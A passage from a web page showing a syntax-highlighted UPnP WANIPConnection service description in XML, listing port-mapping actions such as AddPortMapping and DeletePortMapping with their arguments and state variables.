class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        &lt;/argument​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetSpecificPortMappingEntry<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in&lt;/direction​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>AddPortMapping<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>DeletePortMapping<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">actionList</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">serviceStateTable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>IP_Routed<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span></span><span class="hljs-tag">​      &lt;<span class="hljs-attr">name</span>&gt;</span>PossibleConnectionTypes<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Unconfigured<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>IP_Routed<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>IP_Bridged<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ConnectionStatus<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>Unconfigured<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Unconfigured<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Connecting<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Connected<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>PendingDisconnect<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Disconnecting<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Disconnected<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Uptime<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui4<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>LastConnectionError<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>ERROR_NONE<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>ERROR_NONE<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RSIPAvailable<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>boolean<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NATEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>boolean<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingNumberOfEntries<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui2<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>boolean<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui4<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span 